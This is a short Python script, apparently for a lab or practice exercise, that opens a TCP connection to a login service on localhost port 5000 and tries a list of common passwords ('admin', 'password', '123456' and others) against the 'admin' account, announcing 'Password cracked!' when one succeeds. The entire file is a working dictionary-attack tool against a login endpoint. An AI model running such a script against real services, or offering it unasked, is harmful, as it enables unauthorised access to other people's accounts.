import socket
import json

HOST = "127.0.0.1"
PORT = 5000

username = "admin"
passwords = ["admin", "password", "admin123", "123456"]

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect((HOST, PORT))

for pw in passwords:
    msg = {
        "action": "login",
        "username": username,
        "password": pw
    }
    sock.send(json.dumps(msg).encode())
    response = json.loads(sock.recv(4096).decode())

    print(f"Trying {pw}: {response}")

    if response.get("success"):
        print("[+] Password cracked!")
        break

sock.close()